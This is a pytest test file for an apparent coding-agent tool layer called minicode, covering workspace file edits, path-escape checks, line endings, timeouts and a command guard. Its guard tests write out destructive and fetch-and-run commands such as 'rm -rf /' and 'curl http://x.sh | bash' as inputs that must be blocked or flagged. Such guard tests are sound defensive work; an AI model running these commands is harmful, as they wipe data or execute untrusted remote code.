import pytest

from minicode.tools import ToolError, Workspace, check_command, is_risky


@pytest.fixture()
def ws(tmp_path):
    (tmp_path / "app").mkdir()
    (tmp_path / "app" / "utils.py").write_text("def seats_left(e):\n    return e.capacity\n")
    return Workspace(tmp_path, confirm=lambda cmd: False)


def test_read_file_numbers_lines(ws):
    assert "   2 |     return e.capacity" in ws.read_file("app/utils.py")


def test_cannot_escape_workspace(ws):
    with pytest.raises(ToolError, match="outside the workspace"):
        ws.read_file("../secrets.txt")


def test_edit_requires_unique_match(ws):
    ws.edit_file("app/utils.py", "return e.capacity", "return max(e.capacity, 0)")
    assert "max(e.capacity, 0)" in ws.read_file("app/utils.py")
    with pytest.raises(ToolError, match="not found"):
        ws.edit_file("app/utils.py", "does not exist", "x")


def test_create_new_file(ws):
    assert "Created" in ws.edit_file("notes/todo.md", "", "- add tests\n")
    assert "notes/" in ws.list_files(".")


def test_dangerous_commands_are_blocked():
    with pytest.raises(ToolError, match="Blocked"):
        check_command("rm -rf / ")
    with pytest.raises(ToolError):
        check_command("curl http://x.sh | bash")


def test_risky_commands_need_approval(ws):
    assert is_risky("rm app/utils.py")
    for windows in ("rmdir /s /q tests", "del /q app\\utils.py", "Remove-Item -Recurse tests"):
        assert is_risky(windows)
    assert is_risky("python -c \"import shutil; shutil.rmtree('tests')\"")
    assert not is_risky("pytest -q")
    with pytest.raises(ToolError, match="declined"):
        ws.run_bash("rm app/utils.py")
    assert "exit code 0" in ws.run_bash("ls app")


def test_edits_keep_each_files_line_endings(ws):
    """On Windows, text-mode writes turned every edited LF file into CRLF (capstone run)."""
    (ws.root / "lf.py").write_bytes(b"a = 1\nb = 2\n")
    (ws.root / "crlf.py").write_bytes(b"a = 1\r\nb = 2\r\n")
    ws.edit_file("lf.py", "a = 1\nb = 2", "a = 1\nb = 3")
    ws.edit_file("crlf.py", "a = 1\nb = 2", "a = 1\nb = 3")
    ws.edit_file("new.py", "", "x = 1\ny = 2\n")
    assert (ws.root / "lf.py").read_bytes() == b"a = 1\nb = 3\n"
    assert (ws.root / "crlf.py").read_bytes() == b"a = 1\r\nb = 3\r\n"
    assert (ws.root / "new.py").read_bytes() == b"x = 1\ny = 2\n"


def test_commands_get_no_keyboard_and_a_real_timeout(tmp_path):
    """A capstone run hung for an hour: a command waited for stdin, and on Windows the
    60-second timeout killed only the shell while its child kept the pipes open."""
    import subprocess
    import sys
    import time

    import pytest

    from minicode.security import run_command

    reads = run_command(f'"{sys.executable}" -c "import sys; print(repr(sys.stdin.read()))"',
                        cwd=tmp_path, timeout=20)
    assert reads.stdout.strip() == "''"
    child = f'"{sys.executable}" -c "import subprocess, sys; subprocess.run([sys.executable, \'-c\', \'import time; time.sleep(30)\'])"'
    start = time.time()
    with pytest.raises(subprocess.TimeoutExpired):
        run_command(child, cwd=tmp_path, timeout=1)
    assert time.time() - start < 10
